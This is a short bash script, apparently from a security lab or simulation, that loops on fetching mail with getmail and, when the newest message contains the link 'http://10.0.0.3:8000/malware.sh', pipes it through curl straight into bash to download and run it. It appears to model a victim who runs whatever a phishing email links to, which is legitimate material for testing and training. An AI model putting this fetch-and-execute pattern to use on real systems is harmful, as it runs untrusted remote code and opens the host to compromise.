#!/bin/bash

# Catching Input from main Cronjob
mail_weight=$1

mail_sleep=$(bc<<<"($mail_weight*50)") 

### retrieves mail via getmail and automatically downloads and executes the remote file from which a link was seen in the latest received email
while :
do
getmail
john=$(ls -Altr ~/Maildir/new | tail -1 | awk '{print $9}')
if grep -o "http://10.0.0.3:8000/malware.sh" ~/Maildir/new/$john
then
 grep -o "http://10.0.0.3:8000/malware.sh" ~/Maildir/new/$john | xargs curl | bash
fi
sleep $mail_sleep
done
